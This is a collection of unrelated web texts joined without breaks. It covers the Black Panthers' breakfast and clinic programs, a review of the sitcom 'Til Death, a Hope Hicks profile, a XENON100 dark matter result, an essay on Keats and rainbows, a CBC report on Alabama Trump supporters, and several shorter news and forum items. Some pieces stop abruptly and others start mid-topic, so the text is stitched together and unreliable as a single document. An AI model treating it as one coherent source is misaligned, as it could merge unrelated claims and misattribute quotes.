The free breakfast for schoolchildren program was set up in Berkeley, California, in 1968 by Bobby Seale and Huey P. Newton. It was the first significant community program organized by the Panthers, and perhaps the most well known. By the end of 1969, free breakfast was served in 19 cities, under the sponsorship of the national headquarters and 23 local affiliates. More than 20,000 children received full free breakfast (bread, bacon, eggs, grits) before going to their elementary or junior high school.
Health Clinics
The clinics were called People's Free Medical Centers (PFMC) and eventually were established in 13 cities across the country, from Cleveland to New Haven, Connecticut; and from Winston-Salem, North Carolina, to Los Angeles. Women, according to sociologist Alondra Nelson, were the backbone of the effort — not surprising, considering that approximately 60 percent of Black Panther Party members were female. Some of the clinics were in storefronts, others in trailers or hastily built structures, and most did not last long. But they offered services such as testing for high blood pressure, lead poisoning, tuberculosis and diabetes; cancer detection screenings; physical exams; treatments for colds and flu; and immunization against polio, measles, rubella, and diphtheria. Nelson reports that many of the women and men involved in the PFMCs went on to become credentialed health care professionals.
Imagine for a second that you've been handed a TV show. It's a long-running show, coming up on 100 episodes, yet it's been off the air for almost a year. You have almost complete assurance that when this show gets on the air, no one will be watching it. The show has been retooled over and over and over again until it barely resembles itself, and the whole thing is here only because the production company cut a crazy deal with the network so the show would be on the air long enough to get to syndication. You are, for all intents and purposes, producing a show in a vacuum. You see, this show has a reputation of being absolutely godawful, one of the worst examples of a kind of TV comedy that went out of favor long, long ago. So most everyone has made up their mind on this show anyway, and it's unlikely you're going to win critical favor, no matter what you do. Hell, a prominent TV critic "live blogs" most of your episodes on Twitter and mocks you mercilessly.
To be honest, if I were handed this situation and I couldn't run far, far away for some reason, I would just produce something so balls-out bizarre that it would be borderline unwatchable, a weird expression of just how much I hate the television idiom and working in it, as well as a desperate plea for anyone to watch me, anyone at all.

And if it isn't obvious already, this whole situation really happened this last TV season to the show 'Til Death, a perpetually low-rated sitcom that aired its series finale Sunday, after receiving a number of puzzling renewals and making it to a fourth season and 81 episodes, just shy of syndication. And to the delight of the less than 2 million people who watched it, 'Til Death turned into the weirdest show on television last season, desperately tossing post-modern fourth-wall breaking, weird gimmicks, aggressively unfunny stunt-casting, and storylines that more or less mocked their own existence at the audience. I don't know if I would call the show "good." "Borderline unwatchable" comes close, but it was a far, far more interesting form of bad TV than the show had been in its first three seasons. It was a kind of TV that had simply given up, a kind of TV that was just going to do whatever the hell it wanted, regardless of network notes or audience desires.
The only things that have remained consistent about 'Til Death through its run are Brad Garrett and Joely Fisher as Eddie and Joy Stark, a long-time married couple whose seeming bitterness about the fact that they were still together was meant to drive season after season of conflicts to come. In its first two seasons, the show paired the two with a young, newlywed couple next door. In the third season (of which only seven episodes aired before the show was yanked for just under a year), the newlyweds were gone, and Eddie's little brother, a grown black man played by JB Smoove, inexplicably became another regular, moving in with Joy and Eddie for no apparent reason. And in the fourth season, the show was retooled yet again and thrown under the guidance of veteran comedy producer (and occasional genius) Don Reo, as though Fox and Sony (which produces the show) had no better ideas. Now, Joy and Eddie had to deal with their daughter and her long-term boyfriend, Doug (played by the fine comedy actor Timm Sharp for all four seasons, but only a regular in the final season), as they moved into the couple's backyard.
The first three seasons attempted to draw the sorts of small tales of gentle domestic squabbles that take a weird left turn toward hellish stalemate battles that will never be won that had been in vogue with family sitcoms since Garrett's previous series, Everybody Loves Raymond, had been a hit. What made Raymond work was the sense that underneath everything, the characters really did have some affection for each other. What every show that tried to copy Raymond missed was this very fact, as it seemed like the characters on most of these shows—'Til Death included—were only staying together for health insurance reasons. These were ugly and unpleasant shows to watch, full of bitter people who had no real reason to be so angry at everyone and everything. 'Til Death was a bad show in these seasons, but it was innocuously bad, easy to turn away from.

The fourth season was something else entirely. I don't know how much of this is attributable to Reo (I suspect a lot), but the domestic squabble stuff grew much, much loopier, right from the first. Fisher and Garrett, perhaps emboldened by the fact that nobody was watching, pushed their characters so far into unpleasantness that it looped back around and became fascinating to watch. Their marriage suddenly made so much more sense. The reason Joy and Eddie Stark had stayed together so long was almost entirely because absolutely no one else on Earth would want to put up with them. Perversely, this made the episode-closing scenes every sitcom like this is required to have where the characters say they love each other feel more genuine. When Eddie and Joy nearly drive each other toward bankruptcy because they want an HDTV and also can't stand carpooling together, it seems stupid on its face, but it becomes something much bleaker and despairing in practice. Someone somewhere in the production team was using the season to deliberately skewer this kind of show and this kind of storytelling, and Fisher and Garrett were surprisingly game.
But if that were it, that wouldn't qualify the fourth season of 'Til Death as some sort of weird, outre comedy. It would certainly be more interesting than what the show had been before, but not necessarily worth seeking out. Perhaps realizing that the role of Ally (Joy and Eddie's daughter) had been played by four actresses over the course of the series (including Krysten Ritter!) while the role of boyfriend/fiancee/husband Doug had been played by only Sharp, the series embarked on an astoundingly bizarre story arc: It had Doug realize he was a character in a sitcom whose wife kept getting recast, then sent him to psychotherapy to make peace with this fact.
Here's a Hulu highlight reel, which, sadly, doesn't get at how strangely this all played out within the normal confines of 'Til Death:

By comparison, here's part of a season three episode. See how far you can get.
Now, last season, a much, much better comedy—Community—had a similar running gag, where Abed (Danny Pudi) would crack wise about how the things he and his friends were doing bore some relation to a classic sitcom, riffing on shows like Cheers and Friends and M*A*S*H within the show's normal universe. The show made this safe by edging up closely to breaking the fourth wall but never going so far as to actually break it. The Abed character is one of the better ones on Community and, indeed, on TV right now, but the show would never really have him acknowledge his fictional existence. That would be cheating, more or less. (Similarly, a commenter on one of my reviews this year said that Britta on the same show is a sitcom character who's realized she's bad at being a sitcom character, an observation I've always enjoyed.)

But if you compare what Community did to what 'Til Death did, they're not even in the same universe of gutsy. Community pulled its trick off, and 'Til Death mostly didn't, but Community wasn't attempting anything quite as potentially off-putting as 'Til Death was. The Doug story arc was one of the more unexpected things on TV last year, including the character riffing on the generic brands the other characters were using (and tossing in a tie-in to another storyline, no less), the other characters joking about how if they were a sitcom they'd be in a timeslot where no one would watch them, Doug slowly coming to realize he could neither swear nor have actual sex, and a whole episode where Ally was recast yet again and Doug had to come to terms with it before realizing the actress playing his new wife was much friskier in the bedroom (even as he realized that the camera would cut away before anything would happen).
But wait! There's more! Doug went to therapy with a therapist played by Mayim Bialik, who was gradually revealed to be the actress Mayim Bialik, who was filming a reality show based on her practice, all the better to further disorient Doug. And there were suggestions that she might actually have been the character Blossom, as well as a long, startlingly unfunny scene full of "Yeah, your career's dead, but so is mine!" jokes from some number of former Blossom stars and a fat man who thinks he's Joey Lawrence.
And here's the thing: I haven't even seen every episode of the fourth season of 'Til Death, just the highlights of Doug's arc. It's possible that even weirder stuff crept in around the edges in other episodes. After all, Reo, his cast, and crew could be pretty certain no one was watching this. Why not just do something completely nuts? Further compounding problems and making the show seem even more hallucinatory was Fox's decision to screen the 15 episodes they never aired from season three along with the season four episodes, so the show would ping-pong randomly between a series about a bitter married couple having strained fights and living with JB Smoove to a weird, hallucinatory nightmare of suburban life filtered through the perception of a stoned, possibly mentally ill manchild. Ally would be played by a blonde in one episode (from season three), then a brunette in another, then another brunette in yet another. Plus, Fox aired the episodes all out of order. Doug and Ally's wedding aired before their engagement, and the birth of their first child—intended to be the series finale—was followed by three more rejected third season episodes. The show itself seemed to give up as well, tossing weird, random sound effects and obnoxiously loud music over the top of establishing shots or having a recurring plot where guest star Martin Mull is in a dom-sub relationship with a woman who may or may not be a psychopath.

I don't want to make this sound more interesting than it actually is. There is a fair chance that if you seek the fourth season of 'Til Death out (and it's highly unlikely any of these episodes will ever air again after this summer), you will be disappointed because half the fun was happening upon these episodes in the moment and wondering what world you'd wandered into. By the time Doug and Ally's wedding rolled around, the show had finally lost it completely, tossing in lengthy animated sequences done in styles ranging from Disney to Edward Gorey, letting Fisher sing at length, and having Garrett do Rodney Dangerfield impressions for no apparent reason. You wanted to stop watching; you couldn't look away. This was television made by consummate professionals who were pretty sure no one was ever going to see it, and it was somehow gloriously awful and compellingly watchable all at once.

Glengarry Glen Ross first hit movies theaters 20 years ago today, bringing David Mamet's play about the desperate measures salesmen will take when their jobs are on the line to the big screen. The film didn't do well at the box office in its original run, but it's become a cult classic for its depiction of cutthroat company men and their copious profanity. The most enduring part of the film is undoubtedly Alec Baldwin's "Always Be Closing" speech. "We're adding a little something to this month's sales contest," he informs a team of underperforming salesmen, practically oozing with disdain. "As you all know, first prize is a Cadillac Eldorado ... Second prize? A set of steak knives. Third prize is you're fired." The monologue wasn't even in Mamet's original play, but since the film came out, the speech has become synonymous with Glengarry Glen Ross, spawning countless parodies. To mark the film's 20th anniversary, we've rounded up the best ones.
Public radio is about as far from Alec Baldwin's intimidating character as you can get, and NPR affiliates love subverting their un-intimidating reputation in Glengarry spoofs. Here's WBEZ boss Torey Malatia—the guy This American Life lampoons in their closing credits—berating volunteers during the Chicago station's pledge drive:
Hope Hicks served as White House communications director. She was the press secretary for Donald Trump's presidential campaign and then went on to serve on his communications team once he took office. She was promoted to communications director in September 2017.
Although her name appears in the media often, Hicks kept a very low profile during the campaign, scrubbing her public social media profile and staying away from stories written about her. (She politely declined a Cosmopolitan.com interview request during the campaign.) In December 2016, she spoke briefly at a Trump victory rally in Mobile, Alabama.
i think i can honestly say this is the first time i've heard hope hicks speak pic.twitter.com/HuidZhCNVk — David Mack (@davidmackau) December 17, 2016
Now, reports indicate that Robert Mueller's team investigating whether the Trump campaign colluded with Russia in the 2016 election may be interested in what she knows and what actions she's taken. And she was also at the center of another controversy surrounding former White House staff secretary Rob Porter, who resigned his post amid allegations of domestic abuse.
In February 2018, a day after appearing before the House Intelligence Committee, she said she planned to resign from her post.
Here are 16 things you should know about her:
1. She's from Greenwich, Connecticut, a wealthy suburb of New York.
2. She's a former college jock.
Hicks graduated from Southern Methodist University in Dallas, where she played lacrosse for four years. "She is highly intelligent and brought that to the field in every game … When needed, she carried the team and would score, but preferred to have assists," her former lacrosse coach Liz Holmes told the Washington Post. "She was the ultimate team player and competitor."
Kylie Burchell, Hicks's lacrosse coach, told GQ Hicks was one of the only players to abide by the team's no-alcohol policy. "I think the girls were annoyed at her a little bit," Burchell said. "She was trying to be a leader. She was showing by example what to do."
3. Her career started in 2012, when she joined the public relations firm Hiltzik Strategies.
There, she worked with the Trump organization, according to the Washington Post. (The firm's founder, Matthew Hiltzik, has worked for Hillary Clinton.) In August 2014, she went in-house with Trump, where, according to New York magazine, she handled PR for Ivanka Trump's fashion line and some Trump resorts.

4. Public relations runs in her family.
Her dad, Paul Hicks III, was a top executive at a PR firm and the NFL's executive vice president of communications before his current job: managing director at the Glover Park Group. Paul Hicks, her late grandfather, was vice president and general manager of public relations for Texaco.
5. She had no political experience prior to the Trump campaign.
In January 2015, Trump called her into his office and, according to New York magazine, said he was making her the press secretary for his upcoming presidential campaign, which officially started in June. And that was that.
While she was on the campaign, Hicks took dictation from Trump for his tweets, then sent them to someone else in the Trump organization to actually tweet, the Washington Post reported.
She was also the gatekeeper for Trump's media requests. During the campaign, she reportedly received upwards of 250 requests to speak with him per day, but "she alone decides who gets in and who's kept out," Olivia Nuzzi wrote for GQ. Occasionally, Hicks would accommodate Trump "tantrums" where he declared a certain reporter must be banned for a while.
6. She was the only young woman in Trump's inner circle during the campaign...
...which included Corey Lewandowski [Editor's note: Trump fired Lewandowski on June 20, 2016] , the campaign manager charged with battery after he allegedly roughed up a female reporter. Hicks's job included issuing statements in defense of Lewandowski.

7. Former colleagues and friends praise her incredible work ethic.
And they described her as likable, loyal, and resilient, according to the Washington Post. According to a February 2018 profile in Town & Country, she wakes up at 4 or 4:30 every morning to work out with weights, runs three miles a day, and is at the White House by 6:30 or 7. “She has basically no life outside of this place,” a colleague said.
8. They also said working with such a controversial figure won't hurt her career prospects.
In fact, it'll likely help her. "When looking at Hope [as a job candidate], I'd be less interested in how intimately she was involved in crafting Trump's persona and more interested in how she functions under pressure, works with reporters and carries herself with integrity — all of which she does very well," David Shane, former executive vice president at Hollywood studio Relativity, told the Washington Post.
9. Previous profiles of Hicks have mentioned that she's a dead ringer for supermodel Hilary Rhoda.
It's hardly relevant to her job — though Hicks has worked as a Ralph Lauren model and served as a one-time model for Ivanka Trump's collection in a "street style" blog post — but there is certainly a resemblance. She also modeled for the book cover of a Gossip Girl spin-off.
10. Hicks lived in a Trump apartment during the campaign.
The demands of the campaign reportedly caused the breakup between her and her boyfriend of six years. Though Hicks lived in Greenwich with her sister, she stayed in a Trump apartment in New York City when she was not traveling.
11. She was the only person in the room when Trump gave an explosive interview to the New York Times.
On July 19 2017, Trump gave a 50-minute interview to the New York Times in which he questioned Attorney General Jeff Sessions's decision to recusal himself from the Russian investigation, said FBI special counsel Robert Mueller would cross a line if he looked into the Trump family's finances, suggested former FBI director James Comey briefed him on a dossier of salacious allegations in order to gain leverage over him, and indicated that he believed health insurance is $12 a year. Hicks was the only aide who sat in on the meeting. "She has accepted that he will say things that people find shocking, or upsetting — but she long ago made the decision that she deeply believes in Trump as a leader, and that she wasn't going to change or judge a 70-year-old man whose career highs have been based on trusting his own instincts," according to a Politico piece titled "The Untouchable Hope Hicks."
12. She took over as communications director in August 2017.
Starting in August 2017, Hicks served as the interim communications director at the White House, a promotion that came a few weeks after Anthony Scaramucci was ousted after a 10-day stint in the position. The next month, it was reported that this would be her permanent role.
13. She's reportedly spoken to Robert Mueller's team.
In December 2017, a source told ABC News that Hope Hicks was interviewed by special counsel Robert Mueller's team for their investigation into potential collusion with Russia in the 2016 election.
Then, on January 31, 2018, the New York Times published a story reporting that Mark Corallo, who served as a spokesman for Mr. Trump's legal team before resigning, would tell Mueller's team that Hicks said on a call with him and the president that Donald Trump Jr.'s emails about the Russia meeting would “never get out.”
“She never said that. And the idea that Hope Hicks ever suggested that emails or other documents would be concealed or destroyed is completely false,” Hicks's lawyer Robert P. Trout said in a statement.
14. A scandal involving a former White House aide put her in the spotlight.
Rob Porter, who served as a staff secretary in the Trump administration, resigned in February 2018 after reports surfaced about his ex-wives accusing him of abuse. (Porter denies the allegations against him.) CNN reports that Hicks is in a romantic relationship with Porter, and had helped draft a White House statement defending him. White House spokesman Raj Shah said Hicks had recused herself from some matters surrounding the Porter controversy. But CNN also reported that Trump is "increasingly frustrated" with Hicks, and thinks her relationship clouded her judgment.

15. She's also spoken to the House Intelligence Committee.
In February 2018, Hicks met with House members investigating Russian interference with the election, but according to the Washington Post, she refused to answer questions about anything that had happened since the inauguration. She did tell investigators that she occasionally tells white lies for the president, the New York Times reported, but "she insisted that she had not lied about matters material to the investigations into Russia's interference in the 2016 presidential election and possible links to Trump associates."
16. A day after testifying before House investigators, she announced her plans to resign her post as communications director.
On February 28, 2018, Hicks said she planned to resign, giving no indication of what she planned to do next. Trump praised his long-serving aide, saying “Hope is outstanding and has done great work for the last three years. She is as smart and thoughtful as they come, a truly great person. I will miss having her by my side but when she approached me about pursuing other opportunities, I totally understood. I am sure we will work together again in the future.”
17. After exiting the White House, she took job with Fox.
On October 8, Fox announced that Hicks would join their team as chief communications officer. According to the New York Times, she'll work closely with Lachlan Murdoch, the son of Rupert Murdoch who is expected to become chairman and chief executive.
She isn't the first person to move between Fox and the administration. Bill Shine, the former president of Fox News, took her former role in the White House when she resigned.

Scientists from the XENON collaboration announced a new result from their search for dark matter. The analysis of data taken with the XENON100 detector during 13 months of operation at the Gran Sasso Laboratory (Italy) provided no evidence for the existence of Weakly Interacting Massive Particles (WIMPs), the leading dark matter candidates. Two events being observed are statistically consistent with one expected event from background radiation. Compared to their previous 2011 result the world-leading sensitivity has again been improved by a factor of 3.5. This constrains models of new physics with WIMP candidates even further and it helps to target future WIMP searches. A paper with the results is going to be submitted to Physical Review Letters and on the arXiv.
Cosmological observations consistently point to a picture of our Universe where ordinary matter as we know it makes up only about 4%, while new, yet unobserved forms of so-called dark matter and dark energy make up the rest. This fits to expectations from subatomic physics where extensions of the Standard Model of particle physics suggest that new particles must exist, which have properties making them perfect dark matter candidates. Both cosmology and particle physics provide consistent hints on the existence of dark matter. A search for WIMP particles is therefore well motivated and a direct detection of such particles is the central missing piece of information to confirm this new picture of our Universe.
In 2011, the XENON100 collaboration published results from 100 days of data taking. The achieved sensitivity pushed the limits for WIMPs already by a factor 5 to 10 compared to the previous XENON10 results. During the new run a total of 225 live days of data were accumulated in 2011 and 2012 with lower background and hence improved sensitivity. Again no signal was found. The two observed events are statistically consistent with the expected background of one event. The new data improve the bounds to 2.0×10-45 cm2 for elastic interaction of a WIMP mass of 50 GeV, which is another factor of 3.5, cutting already significantly into the expected WIMP parameter region. Continued measurements with XENON100 and the new experiment XENON1T, currently under construction, should either find evidence for WIMPs or other forms of dark matter would have to be considered.
XENON100 is an ultra-sensitive device using 62 kg of liquid, ultra-pure xenon as a WIMP target, and measures the tiny charge and light signals that are expected from rare collisions between WIMPs and the nuclei of xenon atoms. The detector is operated deep underground at the Gran Sasso National Laboratory of the INFN, in Italy, in order to shield it from cosmic rays which constantly bombard the Earth. To avoid false events due to residual radiation from the detector's surroundings, only data from the inner 34 kg of liquid xenon are taken as candidate events. The detector is in addition shielded by specially designed layers of copper, polyethylene, lead and water, to reduce the background noise even further.
The XENON collaboration consists of scientists from 15 institutions in the USA (Columbia University New York, University of California Los Angeles, Rice University Houston, Purdue University), France (Subatech Nantes), Germany (Max-Planck-Institut für Kernphysik Heidelberg, Johannes Gutenberg University Mainz, Westfälische Wilhelms-Universität Münster), Israel (Weizmann Institute of Science), Italy (Istituto Nazionale di Fisica Nucleare, Università di Bologna), Netherlands (Nikhef Amsterdam), Portugal (Universidade de Coimbra), Switzerland (Universität Zürich), and China (Shanghai Jiao Tong University).
XENON100 is supported by the collaborating institutions and by the National Science Foundation and the Department of Energy in the USA, by the Swiss National Foundation in Switzerland, by l'Institut National de Physique des Particules et de Physique Nucléaire and La Région des Pays de la Loire in France, by the Max Planck Society and by Deutsche Forschungsgemeinschaft in Germany, by the Weizmann Institute of Science, by the German-Israeli Minerva Gesellschaft and GIF in Israel, by FOM in the Netherlands, by the Fundação para a Ciência e Tecnologia in Portugal, by the Istituto Nazionale di Fisica Nucleare in Italy and by STCSM in China.

There was an awful rainbow once in heaven:
We know her woof, her texture; she is given
In the dull catalogue of common things.
—John Keats, Lamia
I am guessing—though it is only a guess—that Keats himself did not know the woof and texture of the rainbow. Not the way that Newton understood rainbows. Perhaps not even at all. Maybe Keats just read, somewhere, that Newton had explained the rainbow as "light reflected from raindrops"—
—which was actually known in the 13th century. Newton only added a refinement by showing that the light was decomposed into colored parts, rather than transformed in color. But that put rainbows back in the news headlines. And so Keats, with Charles Lamb and William Wordsworth and Benjamin Haydon, drank "Confusion to the memory of Newton" because "he destroyed the poetry of the rainbow by reducing it to a prism." That's one reason to suspect Keats didn't understand the subject too deeply.
I am guessing, though it is only a guess, that Keats could not have sketched out on paper why rainbows only appear when the Sun is behind your head, or why the rainbow is an arc of a circle.
If so, Keats had a Fake Explanation. In this case, a fake reduction. He'd been told that the rainbow had been reduced, but it had not actually been reduced in his model of the world.
This is another of those distinctions that anti-reductionists fail to get—the difference between professing the flat fact that something is reducible, and seeing it.
In this, the anti-reductionists are not too greatly to be blamed, for it is part of a general problem.
I've written before on seeming knowledge that is not knowledge, and beliefs that are not about their supposed objects but only recordings to recite back in the classroom, and words that operate as stop signs for curiosity rather than answers, and technobabble which only conveys membership in the literary genre of "science"...
There is a very great distinction between being able to see where the rainbow comes from, and playing around with prisms to confirm it, and maybe making a rainbow yourself by spraying water droplets—
—versus some dour-faced philosopher just telling you, "No, there's nothing special about the rainbow. Didn't you hear? Scientists have explained it away. Just something to do with raindrops or whatever. Nothing to be excited about."
I think this distinction probably accounts for a hell of a lot of the deadly existential emptiness that supposedly accompanies scientific reductionism.
You have to interpret the anti-reductionists' experience of "reductionism", not in terms of their actually seeing how rainbows work, not in terms of their having the critical "Aha!", but in terms of their being told that the password is "Science". The effect is just to move rainbows to a different literary genre—a literary genre they have been taught to regard as boring.
For them, the effect of hearing "Science has explained rainbows!" is to hang up a sign over rainbows saying, "This phenomenon has been labeled BORING by order of the Council of Sophisticated Literary Critics. Move along."
And that's all the sign says: only that, and nothing more.
So the literary critics have their gnomes yanked out by force; not dissolved in insight, but removed by flat order of authority. They are given no beauty to replace the hauntless air, no genuine understanding that could be interested in its own right. Just a label saying, "Ha! You thought rainbows were pretty? You poor, unsophisticated fool. This is part of the literary genre of science, of dry and solemn incomprehensible words."
That's how anti-reductionists experience "reductionism".
Well, can't blame Keats, poor lad probably wasn't raised right.
But he dared to drink "Confusion to the memory of Newton"?
I propose "To the memory of Keats's confusion" as a toast for rationalists. Cheers.
Just so you guys know, Organizing for America is doing a fantastic job combating all those “climate deniers.” Don't believe it? Just ask the president! Or, rather, @BarackObama. OFA is in charge of running the presidential Twitter account, and this afternoon, the “independent organization” congratulated itself for being awesome:
https://twitter.com/RightWingNerd/status/367747801830014976
Painful. Just painful. But what makes the tweet doubly lame?
No one showed in DC! MT @BarackObama: A special thanks to all the @OFA volunteers who called out #climate deniers yesterday… — Steve Milloy (@JunkScience) August 14, 2013

Recently, there was a timeline comic from XKCD about the history of Earth's temperature over the Holocene which got quite a bit of play, due to the fact that it had the inevitable “hockey stick” splice onto the end. Josh came up with a much less dogmatic and more detailed version, which we covered here.
That led Javier, who is a PhD level scientist in molecular biology and biochemistry who recently published an essay at Dr. Judith Curry's website here, to come up with a similar but even more technical cartoon. We may have more on his essay later, but for right now I present his excellent timeline cartoon, that includes Earth's obliquity and temperature over the last 20,000 years. Changes in Earth's obliquity and thus solar insolation angles is believed to be the main driver of long term climate change, initiating and ending ice ages. As seen in the diagram below, the angle between Earth's rotational axis and the normal to the plane of its orbit (obliquity) oscillates between 22.1 and 24.5 degrees on a 41,000-year cycle. It is currently 23.44 degrees and decreasing at a rate of about 0.013° per century.
An often-cited 1980 study by Imbrie determined that,
“Ignoring anthropogenic and other possible sources of variation acting at frequencies higher than one cycle per 19,000 years, this model predicts that the long-term cooling trend that began some 6,000 years ago will continue for the next 23,000 years”
With that in mind, have a look at Javier's cartoon:
NOTE: an updated version of this cartoon timeline was posted on Oct 1, 2016 to fix a couple of typos in text labels pointed out by commenters.

I just went to the post office to get my SS package from the PO box. I found this slip that says I have to come back during regular business hours to retrieve my gift from the clerk. The problem is they weren't open when I got there, and Christmas is Friday (they aren't open on Christmas). Then the weekend (which they also aren't open on) is immediately after Christmas, so I have to wait until Monday the 28th to really get my gift. But my family, who also uses the PO box, says they weren't expecting anything, so I'm pretty confident that this is for the Secret Santa gift. I want to thank my Secret Santa if this really is the gift, and also thank his friend whom he/she is said helped make it. It's certainly bad timing on my part to get there in time, though. I'll be very excited to see the physical gift, nonetheless I'm just glad someone followed through on their promise; it is the season of giving, after all.
Susan Peebles's farm in sunny coastal Alabama doesn't seem like the sort of place for dark talk of armed rebellion and "the downfall of America."
The 57-year-old Donald Trump loyalist grows a modest crop of soybeans and peanuts on 400 acres in Lillian, Ala., near the border with Florida. When the season's right, Peebles Farm welcomes families for blackberry picking.
"Oh, we just get by," she says with a chuckle.
Peebles, a gentle-spoken Southerner, was wearing a psychedelic "We Are the Trumpions" T-shirt last week depicting Trump staring down a lion. But from the wood-panelled living room where she blares Fox News for the conservative musings of Sean Hannity and Lou Dobbs, her timid manner dissolved as she spoke of "revolution," a term that to some ears carries a whisper of violence.
"It's a call to action," Peebles said. And should Trump lose, "it's time for this country to react."

What that means is anyone's guess. Like most farmers in rural Alabama, Peebles keeps shotguns for blasting crop-munching possums. She's among an untold number of Trump "truth seekers" who remain unsure how, or whether, they would accept Democrat Hillary Clinton as commander-in-chief.
Peebles dismisses Milwaukee Sheriff David Clarke's heated remarks about "pitchforks and torches time" as well as former Illinois congressman Joe Walsh's tweet that he'll be "grabbing my musket" to protest a Clinton win.
It's typical media spin, she says. Just making mountains of molehills.
On November 8th, I'm voting for Trump.<br><br>On November 9th, if Trump loses, I'm grabbing my musket.<br><br>You in? —@WalshFreedom
The federal gov has lost its healthy fear of the masses and WE THE PEOPLE. It is pitchfork & torches time in America <a href="https://t.co/xW2Dwu24RB">https://t.co/xW2Dwu24RB</a> <a href="https://t.co/Xlj2SDLEvO">pic.twitter.com/Xlj2SDLEvO</a> —@SheriffClarke
But while Peebles agrees civil disobedience ought to be a last resort, she cites a history of resisting "tyranny" as a precedent.
"It was time for revolution when this country was born. Remember George Washington. Those Founding Fathers at the time, they were traitors to the English Crown, and yet look at the way we look back at them now."
If there was a human cost, she reasons, such was the price of liberty.
"Yes, there was violence. But unfortunately, sometimes that's what it comes to."
Trump has played coy about whether he would concede peacefully and help to unify the nation should he lose. "I will keep you in suspense," he told debate moderator Chris Wallace.

"Horrifying," Clinton said of the remark, which pundits slammed as anger-stoking rhetoric.
At a recent Republican rally in Mobile, though, supporters in "Deplorable"-branded gear adopted the same foreboding tone as they greeted a Trump-Pence bus carrying state GOP grandees.
PJ Owens, a 76-year-old "super volunteer" at Trump's Mobile County headquarters, fears widespread in-person voter fraud, a phenomenon that, according to a 2014 Washington Post investigation, does not exist in any way that could affect results.
Mickey Sheffield, a Trump supporter and retired aluminum plant worker in Mobile, Ala., says he won't be surprised if civil disobedience breaks out if Trump loses. 'I'm 83 years old and I've seen a lot of things go down. It's a possibility,' he says. (Matt Kwong/CBC)
As with many Trump supporters in the Bible Belt, the retired teacher buys into some falsehoods about Clinton.
With charged language, for example, she echoed Trump's claims that Clinton plans to abolish the Second Amendment ("You can bet your dollar on this, they will take your guns away from you"); that Clinton supports unlimited abortion on demand ("Right up until a baby is born, it's fine with her to go ahead and murder the baby"); that a biased liberal media is colluding with the Clinton machine ("The papers are all a bunch of liberal leftists"); and that the Democrats will use voter fraud to cheat their way into the Oval Office.
The 2008 Democratic election of Barack Obama was stolen, Owens believes. "The one we have in office now," she added, is "no doubt a Muslim" born in Indonesia. (In fact, the president was born in Hawaii and is a Christian.)
Owens is ready to protest the election outcome.
"I don't know what's going to happen this time, but it probably won't be good," she said. "It's more than scary."
Alabama Trump supporters stand for the pledge of allegiance outside the Mobile County Republican campaign headquarters. Republicans in the state insist Trump will win the presidential election in a landslide, despite polls indicating he trails Democrat Hillary Clinton. (Matt Kwong/CBC)
Paradoxically, voters claiming Clinton will cheat her way to the White House also predict Trump will triumph next Tuesday.
Revolution is something discussed with hushed voices among Trump's red-meat base in Mobile. There's strong denial in Alabama, a bubble of rigid Southern Republicanism, about Trump's slim presidential odds. And Clinton's lead over Trump has slipped in some polls while the FBI revives its investigation into her emails.
Mickey Sheffield, 83, a retired aluminum plant worker who attended last week's Republican event in Mobile, trusts his eyes more than any scientific polls. With the massive crowds at Trump's campaign events, he reckons this election can't go any way but in Trump's favour.
Otherwise, he's bracing for civil disobedience.
"We pray that don't happen, but it's a possibility. People's real upset."
PJ Owens, left, speaks with fellow volunteers at the Republican campaign office of Mobile County, Ala. 'The Democrat party, in my opinion, will stop at nothing to do whatever it takes to win, even if they have to stuff the ballot boxes,' she says. (Matt Kwong/CBC)
From her living room, Peebles streams every Trump rally she can. She counts video views and up-votes, and she compares the number of positive comments to those on Clinton videos.
By this calculus, she's certain "there's going to be a very huge turnout for Trump," and that he can't lose. This, despite mainstream media reports and recent polls being in near-universal agreement that Clinton is leading by margins as large as 13 points.
The polls are suspect in the South, though, as is the integrity of the electoral process.

Peebles has volunteered to be a "Trump election observer" to prevent voter fraud. Last week, a video circulated among conservatives suggesting that glitchy voting machines in Texas were "vote-switching" from Trump to Clinton. Those reports began circulating on Breitbart, a popular website that has trafficked in alt-right-related stories.
For up to nine hours a day, Peebles researches Clinton's "corruption" on sources like Breitbart, TruthFeed, InfoWars, the Conservative Treehouse and Right Side Broadcasting, amassing a 7,000-plus following on Twitter since she activated her account in January to spread Trump's vision.
'The downfall of this country'
"If Hillary wins, I believe it's going to be the downfall of this country. I mean, I just don't see how the country can survive," Peebles said.
Although Trump has refused to vow he would facilitate a peaceful transition of power, Peebles doesn't object to the wait-and-see approach. That is, wait and see how the election results shake out.
"That's what we're trying to do now, is had the peaceful transition of power, that's what Trump is trying to do," she said.
And if the result proves unfavourable for her candidate?
"Like I say, we'll have to see how it goes. We'll see what the people are willing to do."
After a 2003 adaptation of Alan Moore and Kevin O'Neill's graphic novel failed to launch a hoped-for franchise—and a 2013 TV series never made it past the pilot stage—20th Century Fox is once again tackling The League of Extraordinary Gentlemen.
Perhaps this version will learn from the mistakes of that earlier big-screen effort, which starred Sean Connery in his final role (arguably putting him off making movies forever). At the very, least, it could hardly be worse than the first film, which added American agent Tom Sawyer, as U.S. audiences couldn't be trusted to know or care about such British literary characters as Captain Nemo, Mina Harker, and Dr. Jekyll. (“The listless movie adaptation of The League of Extraordinary Gentlemen has the sweat stains of wasted energy; it's dreary, yet frantic,” remarked the New York Times.)

Jayson Rothwell has been hired to write “The League of Extraordinary Gentlemen.” Ira Napoliello and Matt Reilly are overseeing the remake, based on Alan Moore and Kevin O'Neill's graphic novel of the same name, centering on Victorian-era literary characters such as Captain Nemo, the Invisible Man, Dr. Jekyll and Mr. Hyde teaming to fight a common enemy.

The closely-watched Purchasing Managers Index (PMI) dropped to 45.9 points in the eurozone in September, down from 46.3 points in August, British research group Markit said Thursday, after polling 5,000 eurozone businesses in the course of the month.
The reading showed private sector business activity declining for the eighth consecutive month, Markit Chief Economist Chris Williamson said in a statement, with the data suggesting that the 17-nation currency area would see the "worst quarter for three years" at the end of the month.
"The gloom is clearly reflected in headcounts falling at the fastest rate since January 2010, as companies seek to adjust to weaker demand," he added.
Markit expects a 0.6-percent contraction in Gross Domestic Product (GDP), meaning a return to recession marked by two consecutive quarters of shrinking economic output.
The British researchers said they had hoped a recent announcement by the European Central Bank (ECB) to start buying the debt of struggling eurozone members might have lifted business confidence.
However, business sentiment had taken a "turn for the worse," adding to the "most gloomy" outlook since early 2009.
According to the PMI index, French business activity has suffered a particularly sharp downturn in September, with Europe's second biggest economy likely to shrink by as much as 0.6 percent after zero growth in the first two quarters of 2012.
